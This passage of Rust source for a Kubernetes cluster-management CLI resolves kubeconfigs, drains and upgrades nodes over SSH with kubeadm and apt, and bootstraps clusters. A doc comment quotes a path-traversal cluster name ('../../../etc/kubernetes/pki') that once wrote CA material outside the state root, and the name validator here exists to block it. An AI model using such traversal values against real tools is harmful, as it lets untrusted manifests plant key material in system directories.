/// `delonix cluster <name> get nodes` worked for that very name, because that
/// cluster is provisioned by Ansible and never enters the engine's cache.
/// Used for that hint only — never to resolve an omitted name.
fn reachable_kubeconfig_names_in(root: &Path, home: Option<&Path>) -> Vec<String> {
    let mut names = cached_kubeconfig_names_in(root);
    if let Some(home) = home {
        names.extend(
            std::fs::read_dir(home.join(".kube"))
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    e.file_name()
                        .to_str()
                        .and_then(|f| f.strip_prefix("config-"))
                        .map(String::from)
                }),
        );
    }
    names.sort();
    names.dedup();
    names
}

/// An explicit name passes through as-is (existence is checked when the file
/// is actually read); omitted, this is the same "0/1/many, list the names,
/// never guess" rule `resolve_vm_image` already uses for VM images.
fn resolve_kubeconfig_name(explicit: Option<String>) -> Result<String> {
    resolve_kubeconfig_name_in(explicit, &state_root())
}

fn resolve_kubeconfig_name_in(explicit: Option<String>, root: &Path) -> Result<String> {
    if let Some(n) = explicit {
        return Ok(n);
    }
    let mut names = cached_kubeconfig_names_in(root);
    match names.len() {
        0 => Err(Error::Invalid(
            super::po::t(
                "no cluster kubeconfig cached — run `cluster create`/`cluster apply`/`cluster kubeadm` first",
            )
            .into(),
        )),
        1 => Ok(names.remove(0)),
        n => Err(Error::Invalid(super::po::tf(
            "{n} cluster kubeconfigs cached — say which one. Available: {names}",
            &[("n", &n.to_string()), ("names", &names.join(", "))],
        ))),
    }
}

fn cmd_kubeconfig(name: Option<String>) -> Result<()> {
    let name = resolve_kubeconfig_name(name)?;
    let path = state_root()
        .join("clusters")
        .join(format!("{name}-kubeconfig.yaml"));
    let content = std::fs::read(&path).map_err(|_| {
        let names = cached_kubeconfig_names();
        let hint = if names.is_empty() {
            super::po::t("run `cluster create`/`cluster apply`/`cluster kubeadm` first").into()
        } else {
            super::po::tf("available: {names}", &[("names", &names.join(", "))])
        };
        Error::NotFound(format!("cluster kubeconfig: {name} ({hint})"))
    })?;
    use std::io::Write;
    std::io::stdout().write_all(&content)?;
    Ok(())
}

/// `cluster ls`'s body — also the target of the generic `get clusters`.
///
/// The two verbs pass different `all`, on purpose: `get` is the kubectl-shaped
/// verb and `kubectl get` lists a resource whatever state it is in, while `ls`
/// is the docker-shaped one and `docker ps` lists what is up.
pub(crate) fn cmd_ls(all: bool) -> Result<()> {
    let (_, store) = super::util::open_stores()?;
    super::kindmode::list(&store, all)
}

/// `cluster delete`'s old body — now also the target of the generic `delete clusters`.
pub(crate) fn cmd_delete(name: &str) -> Result<()> {
    let (images, store) = super::util::open_stores()?;
    super::kindmode::delete(&images, &store, name)
}

/// The target of the generic `describe kubernetesclusters` — no native
/// `cluster describe` subcommand exists, and this Kind does not need one yet.
pub(crate) fn cmd_describe(name: &str) -> Result<()> {
    let (_, store) = super::util::open_stores()?;
    super::kindmode::describe(&store, name)
}

fn cmd_health(name: Option<&str>) -> Result<()> {
    let (_, store) = super::util::open_stores()?;
    super::kindmode::health(&store, name)
}

/// The cached kubeconfig path for `name`, or a clear error naming what
/// IS cached — same "0/1/many, list the names, never guess" shape
/// `resolve_kubeconfig_name` already uses, but this one runs after the name
/// is already resolved (or given explicitly by `cluster upgrade`, which
/// reads it straight off the manifest and never goes through
/// `resolve_kubeconfig_name` at all).
/// Two places, in this order, and the second one is the point.
///
/// The engine's own cache holds the clusters the engine created. A cluster
/// provisioned by something else leaves nothing there -- and `~/.kube/config-<name>`
/// is exactly what `delonix-deploy`'s `k8s_control_plane` role writes for every
/// cluster it builds, naming the file after `cluster.name`.
///
/// Reading it is NOT the engine claiming to own those clusters: it does not
/// list them, does not track them, and cannot create or destroy them. It is
/// being handed a name and finding the credentials for it, which is what an
/// operator does by hand today with `export KUBECONFIG=`.
/// `delonix cluster <name> <kubectl args...>`.
fn cmd_kubectl(args: &[String]) -> Result<()> {
    let Some((name, rest)) = args.split_first() else {
        // clap does not hand an external subcommand an empty vector, but the
        // signature allows it and an `unwrap` here would be a panic in a CLI.
        return Err(Error::Invalid(
            super::po::t(
                "cluster: a name and a kubectl command, e.g. `delonix cluster <name> get pods`",
            )
            .to_string(),
        ));
    };
    if rest.is_empty() {
        return Err(Error::Invalid(super::po::tf(
            "cluster {name}: nothing to run — e.g. `delonix cluster {name} get pods`",
            &[("name", name)],
        )));
    }
    let kubeconfig = kubeconfig_path_or_hint(name)?;
    run_kubectl(&kubeconfig, rest)
}

fn kubeconfig_candidates(name: &str, root: &Path, home: Option<&Path>) -> Vec<PathBuf> {
    let mut v = vec![root
        .join("clusters")
        .join(format!("{name}-kubeconfig.yaml"))];
    if let Some(h) = home {
        v.push(h.join(".kube").join(format!("config-{name}")));
    }
    v
}

fn kubeconfig_path_or_hint(name: &str) -> Result<PathBuf> {
    let home = std::env::var_os("HOME").map(PathBuf::from);
    let candidatos = kubeconfig_candidates(name, &state_root(), home.as_deref());
    if let Some(p) = candidatos.iter().find(|p| p.exists()) {
        return Ok(p.clone());
    }
    let cache = candidatos[0].clone();
    let names = reachable_kubeconfig_names_in(&state_root(), home.as_deref());
    let hint = if names.is_empty() {
        super::po::t("run `cluster create`/`cluster apply`/`cluster kubeadm` first").into()
    } else {
        super::po::tf("available: {names}", &[("names", &names.join(", "))])
    };
    // Naming BOTH paths that were tried, because "no kubeconfig" sends the
    // reader looking in the wrong one half the time.
    Err(Error::Invalid(super::po::tf(
        "no kubeconfig for cluster '{name}' — tried {cache} and ~/.kube/config-{name} ({hint})",
        &[
            ("name", name),
            ("cache", &cache.display().to_string()),
            ("hint", &hint),
        ],
    )))
}

/// `kubectl` on the OPERATOR's own machine — never reimplemented here, same
/// "shell out to the host's real client" rule `remote::ssh_run` already
/// follows for `ssh`. `ENOENT` renders as "No such file or directory", which
/// sends the reader looking for a missing FILE rather than a missing TOOL —
/// the exact trap `vmimage::tool_failure_hint`'s own doc comment names for
/// `virt-customize`; named directly here instead, since `kubectl` has no
/// image-build package table to look up.
fn run_kubectl(kubeconfig: &Path, args: &[String]) -> Result<()> {
    let status = Command::new("kubectl")
        .arg(format!("--kubeconfig={}", kubeconfig.display()))
        .args(args)
        .status();
    match status {
        Ok(s) if s.success() => Ok(()),
        Ok(s) => Err(Error::Invalid(super::po::tf(
            "kubectl {args}: failed (exit {code})",
            &[
                ("args", &args.join(" ")),
                (
                    "code",
                    &s.code()
                        .map(|c| c.to_string())
                        .unwrap_or_else(|| "?".into()),
                ),
            ],
        ))),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Err(Error::Invalid(
            super::po::t(
                "kubectl not found on PATH — install it to use `cluster drain`/`cluster \
                 uncordon`/`cluster upgrade` (https://kubernetes.io/docs/tasks/tools/)",
            )
            .into(),
        )),
        Err(e) => Err(Error::Invalid(super::po::tf(
            "running kubectl: {e}",
            &[("e", &e.to_string())],
        ))),
    }
}

/// Shared by the `cluster drain` CLI verb and `cluster upgrade`'s own
/// automatic drain-before-touching-a-node step — one implementation, so the
/// two never drift on which flags a drain actually passes.
pub(crate) fn drain_node(
    name: &str,
    node: &str,
    ignore_daemonsets: bool,
    delete_emptydir_data: bool,
    force: bool,
    timeout: Option<&str>,
) -> Result<()> {
    let kubeconfig = kubeconfig_path_or_hint(name)?;
    let mut args: Vec<String> = vec!["drain".into(), node.into()];
    if ignore_daemonsets {
        args.push("--ignore-daemonsets".into());
    }
    if delete_emptydir_data {
        args.push("--delete-emptydir-data".into());
    }
    if force {
        args.push("--force".into());
    }
    if let Some(t) = timeout {
        args.push(format!("--timeout={t}"));
    }
    run_kubectl(&kubeconfig, &args)?;
    println!(
        "{}",
        super::po::tf(
            "cluster '{name}': node {node} drained",
            &[("name", name), ("node", node)],
        )
    );
    Ok(())
}

/// See [`drain_node`] — same sharing rationale, the other half of the pair.
pub(crate) fn uncordon_node(name: &str, node: &str) -> Result<()> {
    let kubeconfig = kubeconfig_path_or_hint(name)?;
    run_kubectl(&kubeconfig, &["uncordon".to_string(), node.to_string()])?;
    println!(
        "{}",
        super::po::tf(
            "cluster '{name}': node {node} uncordoned",
            &[("name", name), ("node", node)],
        )
    );
    Ok(())
}

/// The one `kind: KubernetesCluster` document a manifest must declare for
/// `cluster upgrade` to act on — deliberately refuses more than one, unlike
/// `apply()` (which applies every Cluster doc it finds): an upgrade touches
/// live, already-bootstrapped hosts one at a time, and guessing which of
/// several clusters in one manifest the operator meant would be exactly the
/// silent-wrong-target class of bug `valid_endpoint`'s own history already
/// warns about.
fn single_cluster_doc(docs: &[ManifestDoc]) -> Result<(&ManifestDoc, ClusterSpec)> {
    let clusters = manifest::of_kind(docs, k::CLUSTER);
    match clusters.as_slice() {
        [doc] => {
            let spec: ClusterSpec = manifest::spec_of(doc)?;
            Ok((doc, spec))
        }
        [] => Err(Error::Invalid(
            super::po::t("no `kind: KubernetesCluster` document in the manifest").into(),
        )),
        _ => Err(Error::Invalid(
            super::po::t(
                "more than one `kind: KubernetesCluster` document — `cluster upgrade` upgrades \
                 one cluster at a time, say which with a manifest that declares only it",
            )
            .into(),
        )),
    }
}

/// Finds a control-plane-join or worker host by its label (hostname, or IP
/// when no hostname is set — same identity `HostSpec::label()` already
/// defines) among every host EXCEPT the control-plane leader
/// (`hosts[0]`), which `cluster upgrade` without `--node` already owns —
/// `kubeadm upgrade node` is the wrong verb there (kubeadm's own upgrade
/// procedure runs `upgrade apply` on the leader and `upgrade node`
/// everywhere else), so matching it here would silently run the wrong
/// command against the right host.
fn find_upgrade_target<'a>(spec: &'a ClusterSpec, label: &str) -> Result<&'a HostSpec> {
    let leader = spec.control_plane.hosts.first();
    if leader.is_some_and(|h| h.label() == label) {
        return Err(Error::Invalid(super::po::tf(
            "'{label}' is the control-plane leader — omit --node to upgrade it \
             (that host runs `kubeadm upgrade apply`, not `kubeadm upgrade node`)",
            &[("label", label)],
        )));
    }
    spec.control_plane
        .hosts
        .iter()
        .skip(1)
        .chain(spec.workers.hosts.iter())
        .find(|h| h.label() == label)
        .ok_or_else(|| {
            let names: Vec<String> = spec
                .control_plane
                .hosts
                .iter()
                .skip(1)
                .chain(spec.workers.hosts.iter())
                .map(|h| h.label())
                .collect();
            Error::Invalid(super::po::tf(
                "no host named '{label}' in the manifest — available: {names}",
                &[("label", label), ("names", &names.join(", "))],
            ))
        })
}

/// Bumps `pkg`(s) to `version` via the SAME `pkgs.k8s.io` repository
/// `k8s_recipes::k8s_host_recipes` already configured on this host, and
/// re-holds them afterward. The `=<version>-*` apt version glob sidesteps
/// needing the exact Debian revision suffix (`1.32.1-1.1`) that only the
/// repository itself knows — `apt-get install pkg=1.32.1` alone would 404 on
/// the FULL package version string, not the Kubernetes version.
fn bump_k8s_packages(target: &SshTarget, label: &str, version: &str, pkgs: &[&str]) -> Result<()> {
    let pkg_specs: Vec<String> = pkgs.iter().map(|p| format!("{p}={version}-*")).collect();
    let unhold = pkgs.join(" ");
    let cmd = format!(
        "apt-mark unhold {unhold} >/dev/null 2>&1; apt-get update -qq && apt-get install -y \
         --allow-change-held-packages {} && apt-mark hold {unhold}",
        pkg_specs.join(" "),
    );
    remote::ssh_run(target, &cmd)
        .map_err(|e| Error::Invalid(format!("[{label}] upgrading {unhold}: {e}")))?;
    Ok(())
}

/// `--to <version>`, no `--node`: the control-plane LEADER step of kubeadm's
/// own upgrade procedure — bump kubeadm, `kubeadm upgrade apply`, then bump
/// kubelet/kubectl and restart, draining/uncordoning around that last part
/// (the leader still runs workloads unless tainted, so it is drained like
/// any other node touched here).
fn upgrade_control_plane_leader(
    cluster_name: &str,
    spec: &ClusterSpec,
    version: &str,
    no_drain: bool,
) -> Result<()> {
    let leader =
        spec.control_plane.hosts.first().ok_or_else(|| {
            Error::Invalid(super::po::t("manifest has no control-plane host").into())
        })?;
    let target = target_for(leader, &spec.ssh);
    let label = leader.label();

    bump_k8s_packages(&target, &label, version, &["kubeadm"])?;
    remote::ssh_run(
        &target,
        &format!("kubeadm upgrade apply v{version} -y --cri-socket={DELONIX_CRI_SOCKET}"),
    )
    .map_err(|e| Error::Invalid(format!("[{label}] kubeadm upgrade apply: {e}")))?;

    if !no_drain {
        drain_node(cluster_name, &label, true, true, true, None)?;
    }
    bump_k8s_packages(&target, &label, version, &["kubelet", "kubectl"])?;
    remote::ssh_run(
        &target,
        "systemctl daemon-reload && systemctl restart kubelet",
    )
    .map_err(|e| Error::Invalid(format!("[{label}] restarting kubelet: {e}")))?;
    if !no_drain {
        uncordon_node(cluster_name, &label)?;
    }
    println!(
        "{}",
        super::po::tf(
            "cluster '{name}': control-plane leader {label} upgraded to {version}",
            &[
                ("name", cluster_name),
                ("label", &label),
                ("version", version)
            ],
        )
    );
    Ok(())
}

/// `--to <version> <NODE>`: kubeadm's own `upgrade node` step, for
/// every host EXCEPT the leader (other control-planes, and workers).
fn upgrade_one_node(
    cluster_name: &str,
    spec: &ClusterSpec,
    node_label: &str,
    version: &str,
    no_drain: bool,
) -> Result<()> {
    let host = find_upgrade_target(spec, node_label)?;
    let target = target_for(host, &spec.ssh);
    let label = host.label();

    bump_k8s_packages(&target, &label, version, &["kubeadm"])?;
    remote::ssh_run(&target, "kubeadm upgrade node")
        .map_err(|e| Error::Invalid(format!("[{label}] kubeadm upgrade node: {e}")))?;

    if !no_drain {
        drain_node(cluster_name, &label, true, true, true, None)?;
    }
    bump_k8s_packages(&target, &label, version, &["kubelet", "kubectl"])?;
    remote::ssh_run(
        &target,
        "systemctl daemon-reload && systemctl restart kubelet",
    )
    .map_err(|e| Error::Invalid(format!("[{label}] restarting kubelet: {e}")))?;
    if !no_drain {
        uncordon_node(cluster_name, &label)?;
    }
    println!(
        "{}",
        super::po::tf(
            "cluster '{name}': node {label} upgraded to {version}",
            &[
                ("name", cluster_name),
                ("label", &label),
                ("version", version)
            ],
        )
    );
    Ok(())
}

fn cmd_upgrade(file: Option<PathBuf>, to: &str, node: Option<&str>, no_drain: bool) -> Result<()> {
    if !valid_version(to) {
        return Err(Error::Invalid(super::po::tf(
            "--to '{v}': invalid Kubernetes version (digits and dots only, e.g. 1.32.1)",
            &[("v", to)],
        )));
    }
    let path = manifest::resolve_path(file)?;
    let docs = manifest::load(&path)?;
    let (doc, spec) = single_cluster_doc(&docs)?;
    let name = &doc.metadata.name;
    check_cluster_name(name)?;
    validate(&spec)?;
    if spec.mode != "ssh" {
        return Err(Error::Invalid(super::po::tf(
            "cluster '{name}': `cluster upgrade` only supports `mode: ssh` (already-live hosts) \
             — `mode: kind`/`mode: vm` clusters are recreated, not upgraded in place",
            &[("name", name)],
        )));
    }
    match node {
        None => upgrade_control_plane_leader(name, &spec, to, no_drain),
        Some(n) => upgrade_one_node(name, &spec, n, to, no_drain),
    }
}

/// A cluster name is joined into local paths (`<root>/clusters/<name>/...`,
/// `<name>-kubeconfig.yaml`, the etcd PKI dir) and into remote hostnames, and
/// it comes straight from `metadata.name` of a manifest that may be untrusted.
/// Same whitelist idea as `delonix_vm::valid_vm_name`: `metadata.name:
/// "../../../etc/kubernetes/pki"` used to make `cluster apply` write CA
/// material outside the state root.
pub(crate) fn valid_cluster_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 63
        && !name.starts_with(['-', '.'])
        && !name.contains("..")
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

pub(crate) fn check_cluster_name(name: &str) -> Result<()> {
    if valid_cluster_name(name) {
        Ok(())
    } else {
        Err(Error::Invalid(super::po::tf(
            "invalid cluster name '{name}' — letters, digits, '-', '_' and '.' only, no '..', at most 63 characters",
            &[("name", name)],
        )))
    }
}

pub fn apply(docs: &[ManifestDoc], cri_bin: Option<&std::path::Path>) -> Result<()> {
    for doc in manifest::of_kind(docs, k::CLUSTER) {
        let name = &doc.metadata.name;
        let spec: ClusterSpec = manifest::spec_of(doc)?;
        // The top-level guard only ever looks at the spec's own keys, so a
        // typo INSIDE `spec.network` (`kubeproxy:` for `kubeProxy:`) was
        // swallowed and simply became "the default" — a network setting that
        // reads as honoured and was not, which is the whole class of bug this
        // block exists to stop.
        manifest::warn_unknown_fields_in(doc, "network", CLUSTER_NETWORK_FIELDS);
        validate(&spec)?;
        // `cluster apply` (manifest-driven) keeps the historical timing: no
        // wait for node Ready. `cluster kubeadm --copy-kubeconfig` is the
        // opt-in path for that (see `provision_and_apply`).
        // A manifest has no `--use-context`: `cluster apply -f` is the
        // declarative path and silently repointing `kubectl` is not something a
        // file applied in a loop should do. The printed switch line is how this
        // path says where kubectl ended up.
        apply_one(name, &spec, false, cri_bin, ContextTakeover::Keep)?;
    }
    Ok(())
}

fn apply_one(
    name: &str,
    spec: &ClusterSpec,
    wait_ready: bool,
    cri_bin: Option<&std::path::Path>,
    takeover: ContextTakeover,
) -> Result<()> {
    check_cluster_name(name)?;
    validate(spec)?;
    // `spec.mode` chooses the path — the common fields (k8sVersion/podSubnet/
    // cni) hold in all three; only the mode-specific block changes.
    match spec.mode.as_str() {
        "kind" => return apply_kind(name, spec),
        "vm" => return apply_vm(name, spec, wait_ready, cri_bin, takeover),
        _ => {} // `ssh` follows below (the original path)
    }
    apply_ssh(name, spec, wait_ready, cri_bin, takeover)
}

/// `mode: kind` — nodes in containers on this machine (see `cmd::kindmode`).
fn apply_kind(name: &str, spec: &ClusterSpec) -> Result<()> {
    if spec.control_plane.count() > 1 {
        return Err(Error::Invalid(
            super::po::t(
                "`mode: kind` only supports 1 control-plane for now (HA needs a stable endpoint \
                 in front of the nodes — see cluster-ssh.yaml)",
            )
            .into(),
        ));
    }
    let (images, store) = super::util::open_stores()?;
    super::kindmode::create(
        &images,
        &store,
        &super::kindmode::KindCluster {
            name: name.to_string(),
            image: spec.kind.image.clone(),
            api_port: spec.kind.api_server_port,
            pod_subnet: spec.pod_subnet.clone(),
            service_subnet: spec.service_subnet.clone(),
            cni: spec.cni.clone(),
            k8s_version: spec.k8s_version.clone(),
            workers: spec.workers.count(),
            // The `> 1` case was already rejected above, for the same reason.
            control_planes: 1,
        },
    )
}

/// `mode: vm` — provisions VMs from the golden image and bootstraps them over SSH.
/// Reuses `cluster kubeadm`'s `provision_and_apply` (zero duplication).
fn apply_vm(
    name: &str,
    spec: &ClusterSpec,
    wait_ready: bool,
    cri_bin: Option<&std::path::Path>,
    takeover: ContextTakeover,
) -> Result<()> {
    let network = spec.vm.network.clone().ok_or_else(|| {
        Error::Invalid(
            super::po::t(
                "`mode: vm` requires `spec.vm.network` (create it first with `delonix network create`)",
            )
            .into(),
        )
    })?;
    let boot_timeout = spec
        .vm
        .boot_timeout
        .as_deref()
        .map(|t| t.trim_end_matches('s').parse::<u64>().unwrap_or(300))
        .unwrap_or(300);
    provision_and_apply(ProvisionArgs {
        name: name.to_string(),
        control_plane: spec.control_plane.count(),
        workers: spec.workers.count(),
        vm_image: spec.vm.image.clone(),
        network,
        ssh_key: spec.vm.ssh_key.clone(),
        vcpus: spec.vm.vcpus.unwrap_or(2),
        memory: spec.vm.memory.clone().unwrap_or_else(|| "2G".to_string()),
        k8s_version: spec.k8s_version.clone(),
        pod_subnet: spec.pod_subnet.clone(),
        service_subnet: spec.service_subnet.clone(),
        cni: spec.cni.clone(),
        net_block: NetworkBlock {
            dataplane: spec.network.dataplane.clone(),
            kube_proxy: spec.network.kube_proxy.clone(),
            mtu: spec.network.mtu,
            node_mtu: spec.network.node_mtu,
            ip_family: spec.network.ip_family.clone(),
            interface: spec.network.interface.clone(),
            multus: spec.network.multus,
            hubble: spec.network.hubble,
            experimental: spec.network.experimental,
            offline: spec.network.offline,
        },
        boot_timeout,
        copy_kubeconfig: wait_ready,
        // `mode: vm` (manifest-driven) doesn't auto-provision a dedicated etcd
        // cluster this round — only the `cluster kubeadm` CLI's `--etcd-cluster`
        // does (see AGENTS.md). `validate()` rejects `spec.etcd.mode: external`
        // combined with `mode: vm` outright, so this is never silently dropped.
        etcd_cluster: None,
        cri_bin: cri_bin.map(|p| p.to_path_buf()),
        use_context: takeover == ContextTakeover::Switch,
    })
}

/// Combines the per-host `prepare_host` outcomes collected across the
/// parallel `std::thread::scope` in `apply_ssh` into a single `Result` — pure
/// (testable without any real SSH). Empty = every host prepared cleanly.
fn combine_host_prep_errors(errors: Vec<String>) -> Result<()> {
    if errors.is_empty() {
        Ok(())
    } else {
        Err(Error::Invalid(errors.join("; ")))
    }
}

/// `mode: ssh` — remote hosts ALREADY live (the original path, unchanged).
fn apply_ssh(
    name: &str,
    spec: &ClusterSpec,
    wait_ready: bool,
    cri_bin: Option<&std::path::Path>,
    takeover: ContextTakeover,
) -> Result<()> {
    let cri_bin = vmimage::resolve_cri_bin(cri_bin.map(|p| p.to_path_buf()))?;
    let cri_service = vmimage::workspace_dist_file("delonix-cri.service")?;
    // The CLI running THIS command — installed on every node alongside
    // delonix-cri, for the reason `install_cli`'s doc comment states: a node
    // provisioned from a golden image otherwise keeps running whatever
    // `delonix` was baked into it, no matter how new the CRI next to it is.
    let cli_bin = std::env::current_exe()
        .and_then(|p| p.canonicalize())
        .map_err(|e| Error::Invalid(format!("resolving this CLI's own binary path: {e}")))?;
    // The node preflight, for a host whose golden predates it. Best-effort on
    // purpose: a `delonix` that cannot produce the script must not refuse to
    // bootstrap a node that already carries one — `run_node_preflight` is
    // where the "neither" case is reported, and it reports it instead of
    // passing in silence.
    let preflight_script = vmimage::workspace_dist_file("delonix-node-preflight.sh").ok();

    let all_hosts: Vec<&HostSpec> = spec
        .control_plane
        .hosts
        .iter()
        .chain(spec.workers.hosts.iter())
        .collect();

    // Same `Progress` convention as `provision_and_apply` above (and
    // `kindmode`'s own `create`) — one spinner per logical stage, not per
    // host/command. This is a SEPARATE `Progress` instance: `cluster apply
    // -f` reaches this function directly, without ever going through
    // `provision_and_apply`'s own progress block.
    let mut p = output::Progress::new();

    // O plano ANTES do primeiro passo — a pergunta a que um spinner não responde
    // é «quanto falta», e aqui cada passo demora minutos. Os títulos são os
    // MESMOS que os `p.step` a seguir usam (mesma chave de tradução, mesma
    // interpolação): duas listas a dizerem o mesmo por palavras diferentes
    // seriam duas coisas para manter de acordo, e este repo já pagou isso com o
    // `CONVERGING_KINDS`. Os passos condicionais entram só quando a condição que
    // os cria é verdadeira, senão o plano prometia trabalho que ninguém vai
    // fazer — pior do que não o anunciar.
    let plano = bootstrap_plan(spec, wait_ready);
    p.plan(&plano);

    p.step(
        &super::po::tf(
            "Preparing {n} host(s)",
            &[("n", &all_hosts.len().to_string())],
        ),
        "🔧",
    );
    // Gap closed: host prep used to run sequentially, one SSH round-trip at a
    // time, even though each host is entirely independent (separate SSH
    // session, separate `apt`/`dpkg` state, no shared mutable data) — an
    // N-host cluster paid N × (apt update + package install + delonix-cri
    // deploy) back to back instead of in parallel. `std::thread::scope` lets
    // the closures borrow `spec`/`cri_bin`/`cri_service` directly (no `Clone`
    // needed beyond the already-owned `SshTarget`/label per host). Unlike the
    // old fail-fast loop (stop at the first bad host, others never attempted),
    // every host is now prepared regardless of the others' outcome and ALL
    // failures are reported together — strictly more useful for an operator
    // fixing a multi-host manifest than discovering one broken host per run.
    let errors: Vec<String> = std::thread::scope(|scope| {
        let handles: Vec<_> = all_hosts
            .iter()
            .map(|h| {
                let target = target_for(h, &spec.ssh);
                let label = h.label();
                let prep = HostPrep {
                    k8s_version: spec.k8s_version.as_deref(),
                    cri_bin: &cri_bin,
                    cri_service: &cri_service,
                    cli_bin: &cli_bin,
                    profile: &spec.cni,
                    preflight_script: preflight_script.as_deref(),
                };
                scope.spawn(move || prepare_host(&target, &label, &prep))
            })
            .collect();
        handles
            .into_iter()
            .filter_map(|h| match h.join() {
                Ok(Ok(())) => None,
                Ok(Err(e)) => Some(e.to_string()),
                Err(_) => Some(super::po::t("host prep thread panicked").to_string()),
            })
            .collect()
    });
    combine_host_prep_errors(errors)?;
    p.ok();

    // Dedicated etcd cluster (`etcd.mode: external`) — bootstrapped BEFORE
    // `kubeadm init` needs its endpoints/PKI. `validate()` already guarantees
    // `spec.etcd.hosts` is non-empty and odd-sized here (or exactly 1, for
    // dev/test, which gets a loud non-HA warning).
    let (etcd_endpoints, etcd_pki_dir): (Vec<String>, Option<PathBuf>) = if spec.etcd.mode
        == "external"
    {
        if spec.etcd.hosts.len() == 1 {
            output::warn(super::po::t(
                    "etcd.hosts has only 1 member — no HA (a single etcd node is a single point of failure)",
                ));
        }
        p.step(super::po::t("Bootstrapping the etcd cluster"), "🗄️");
        let members: Vec<(String, SshTarget)> = spec
            .etcd
            .hosts
            .iter()
            .map(|h| (h.label(), target_for(h, &spec.ssh)))
            .collect();
        let result = etcd::bootstrap_etcd_cluster(name, &members, spec.k8s_version.as_deref())?;
        p.ok();
        (result.endpoints, Some(result.pki_dir))
    } else {
        (Vec::new(), None)
    };

    let cp1 = &spec.control_plane.hosts[0];
    let cp1_target = target_for(cp1, &spec.ssh);
    let endpoint = spec
        .control_plane_endpoint
        .clone()
        .unwrap_or_else(|| cp1.ip.clone());

    p.step(
        super::po::t("Bootstrapping control-plane (kubeadm init)"),
        "🕹️",
    );
    if let Some(dir) = &etcd_pki_dir {
        etcd::push_etcd_client_pki(&cp1_target, dir)?;
    }
    let info = kubeadm_init(&cp1_target, &cp1.label(), &endpoint, spec, &etcd_endpoints)?;
    p.ok();

    // The kubeconfig is cached the moment `admin.conf` exists, and not after
    // the cluster converges, because every step below can fail and every one
    // of those failures is diagnosed THROUGH this file. `kubectl_passthrough`
    // resolves `<root>/clusters/<name>-kubeconfig.yaml`, so fetching it last
    // made DX-6704's own advice — «look with `delonix cluster {name} -n {ns}
    // describe daemonset {ds}`» — answer DX-1000 "no kubeconfig for cluster"
    // every single time it was printed. Measured 2026-10-20 on a 3+2 VM
    // cluster whose flannel agents never came up: the error named two
    // commands, the cluster directory held `id_ed25519`, `id_ed25519.pub`
    // and `network-profile.json`, and neither command could run.
    //
    // Nothing is re-read later: `admin.conf` is written once by `kubeadm
    // init` with the control-plane endpoint already baked in, and a join
    // does not change it — so the bytes cached here are the bytes the old
    // code cached at the end.
    //
    // A failure HERE is still a failure of the whole bootstrap, not a
    // warning: it means the control-plane that was just created cannot be
    // reached or the state root cannot be written, and installing a pod
    // network on top of that would only produce a second, worse error.
    p.step(super::po::t("Fetching kubeconfig"), "📇");
    let kubeconfig_path = fetch_kubeconfig(&cp1_target, name, takeover)?;
    p.ok();

    // `spec.cni` used to be validated by round-trip and then never read again
    // anywhere in this function — every cluster bootstrapped through this
    // path stayed `NotReady` forever, with nothing but a manual
    // `kubectl apply -f <cni>.yaml` able to fix it (see the KaaS capability
    // audit, docs/discovery/kaas-matrix-2026-10-08.md, gap #1). Only the
    // provably safe case is wired up here: EXACTLY one node total. A plain
    // bridge CNI gives that one node working pod networking (the same
    // conflist delonix-cri's own root-CNI path uses for every pod sandbox —
    // ADR-0074), but has nothing that routes pod traffic BETWEEN nodes. A
    // multi-node cluster with `cni: default` never gets here:
    // `net_profiles::validate` refuses it before any machine is created
    // (#799), and `cni: none` is the operator saying they bring their own.
    if installs_default_cni(spec) {
        p.step(
            super::po::t("Installing the default CNI (bridge, single node)"),
            "🔌",
        );
        ensure_single_node_cni(&cp1_target, &spec.pod_subnet)?;
        p.ok();
    }

    // The selectable profiles — the step that closes the gap above for more
    // than one node. HERE, between `init` and the joins, on purpose: a node
    // that joins a cluster whose pod network is already installed gets the
    // agent scheduled onto it as part of joining, instead of sitting
    // `NotReady` until something notices.
    if installs_profile(spec) {
        install_network_profile(&cp1_target, name, spec, &endpoint, &mut p)?;
    }

    if spec.control_plane.hosts.len() > 1 {
        p.step(
            &super::po::tf(
                "Joining {n} more control-plane(s)",
                &[("n", &(spec.control_plane.hosts.len() - 1).to_string())],
            ),
            "🎮",
        );
        for h in &spec.control_plane.hosts[1..] {
            let target = target_for(h, &spec.ssh);
            if let Some(dir) = &etcd_pki_dir {
                etcd::push_etcd_client_pki(&target, dir)?;
            }
            kubeadm_join(&target, &h.label(), &endpoint, &info, true)?;
        }
        p.ok();
    }
    if !spec.workers.hosts.is_empty() {
        p.step(
            &super::po::tf(
                "Joining {n} worker(s)",
                &[("n", &spec.workers.hosts.len().to_string())],
            ),
            "🚜",
        );
        for h in &spec.workers.hosts {
            let target = target_for(h, &spec.ssh);
            kubeadm_join(&target, &h.label(), &endpoint, &info, false)?;
        }
        p.ok();
    }

    // Whether this run actually OBSERVED every node Ready — the one thing
    // that is allowed to make the final line below say "ready". `None` =
    // never checked (the historical `cluster apply -f` timing, which passes
    // `wait_ready: false` on purpose — see `apply()`'s own comment); `Some`
    // = checked, with the true/false from `wait_for_cluster_ready` itself.
    let expected = spec.control_plane.hosts.len() + spec.workers.hosts.len();
    let confirmed_ready = if installs_profile(spec) {
        // A profile waits on BOTH halves — its own agent on every node and
        // every node `Ready` — and a timeout is an ERROR, not a warning. The
        // engine installed this pod network; "I applied it and did not look"
        // is not a report it is allowed to make. The deadline is longer than
        // the historical 180s because the first thing a fresh agent does is
        // pull its own image on every node.
        let profile = super::net_profiles::Profile::parse(&spec.cni)
            .unwrap_or(super::net_profiles::Profile::None);
        p.step(
            &super::po::tf(
                "Waiting for the {cni} pod network and all nodes to be Ready",
                &[("cni", &spec.cni)],
            ),
            "⏳",
        );
        let r = net_profiles_install::wait_until_ready(
            &cp1_target,
            name,
            profile,
            expected as u32,
            Duration::from_secs(420),
        )?;
        p.ok();
        output::info(&super::po::tf(
            "{cni} agent Ready on {ar}/{ad} node(s); {nr}/{nt} node(s) Ready",
            &[
                ("cni", &spec.cni),
                ("ar", &r.agents_ready.to_string()),
                ("ad", &r.agents_desired.to_string()),
                ("nr", &r.nodes_ready.to_string()),
                ("nt", &r.nodes_total.to_string()),
            ],
        ));
        Some(true)
    } else if waits_for_ready(spec, wait_ready) {
        p.step(super::po::t("Waiting for all nodes to be Ready"), "⏳");
